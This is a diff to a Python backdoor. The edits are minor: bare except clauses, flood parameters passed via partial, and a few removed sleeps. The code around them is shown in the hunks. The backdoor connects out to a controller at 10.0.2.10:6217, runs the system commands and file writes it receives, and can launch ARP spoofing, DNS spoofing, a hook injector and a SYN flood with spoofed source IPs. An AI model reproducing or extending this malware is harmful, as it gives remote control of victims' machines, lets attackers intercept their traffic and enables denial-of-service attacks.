@@ -133,7 +133,7 @@ def arp_spoof(targets, src):
                         spoof(target_ip, src)
                         spoof(src, target_ip)
                 sleep(2)
-        except Exception:
+        except:
             print("[!] Something went wrong ... Resetting ARP Tables...")
             cleanup(targets, src)
             with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
@@ -195,7 +195,7 @@ def dns_spoof(target_website, modified_ip):
                )
     try:
         queue.run()
-    except Exception:
+    except:
         print("[!] Something went wrong ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
         print("[+] Done.")
@@ -208,7 +208,7 @@ def hook():
     queue.bind(1, process_packet_hook)
     try:
         queue.run()
-    except Exception:
+    except:
         print("[!] Something went wrong ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
         print("[+] Done.")
@@ -265,7 +265,7 @@ def randomize_integer():
     return random_int
 
 
-def syn_flooding(port):
+def syn_flooding(port, flood_ip, flood_time):
     for _ in range(flood_time):
         ip_packet = scapy.IP()
         ip_packet.src = randomize_ip()
@@ -354,14 +354,14 @@ class Backdoor:
     def reconnect(self):
         try:
             self.connection.close()
-        except Exception:
+        except:
             pass
         sleep(5)
         try:
             self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.connection.connect((self.ip, self.port))
             self.connected.value = True
-        except Exception:
+        except:
             self.connected.value = False
 
     # function that sends json objects through socket connection
@@ -427,7 +427,6 @@ class Backdoor:
                                 dns_process = multiprocessing.Process(target=dns_spoof,
                                                                       args=(target_website, modified_ip))
                                 print("[+] Initializing Dns Spoof...")
-                                sleep(0.1)
                                 dns_process.start()
                             else:
                                 print('[-] No arp spoof running at the moment.')
@@ -447,7 +446,6 @@ class Backdoor:
                                 global hook_process
                                 hook_process = multiprocessing.Process(target=hook)
                                 print("[+] Initializing Hook Injector...")
-                                sleep(0.1)
                                 hook_process.start()
                             else:
                                 print('[-] No arp spoof running at the moment.')
@@ -455,13 +453,11 @@ class Backdoor:
                             print('[-] No arp spoof running at the moment.')
                     elif command[0] == "synflood":
                         try:
-                            global flood_ip
-                            global flood_time
                             flood_ip = command[1]
                             flood_ports = list(map(int, command[2].translate({ord(i): None for i in '[]'}).split(',')))
                             flood_time = int(command[3])
                             pool = multiprocessing.Pool(processes=len(flood_ports))
-                            pool.map(syn_flooding, flood_ports)
+                            pool.map(partial(syn_flooding, flood_ip=flood_ip, flood_time=flood_time), flood_ports)
                             pool.close()
                             pool.join()
                         except:
@@ -575,7 +571,7 @@ class Backdoor:
                                 command_result = write_file(command[1], command[2])
                             else:
                                 command_result = execute_system_command(command)
-                        except Exception:
+                        except:
                             command_result = "[-] Error during command execution."
                         self.reliable_send(command_result)
                 except OSError:
@@ -589,10 +585,8 @@ try:
     arp_process = None
     dns_process = None
     hook_process = None
-    flood_ip = None
-    flood_time = None
     router_ip = scapy.conf.route.route("0.0.0.0")[2]
     my_backdoor = Backdoor("10.0.2.10", 6217)
     my_backdoor.run()
-except Exception:
+except:
     sys.exit()
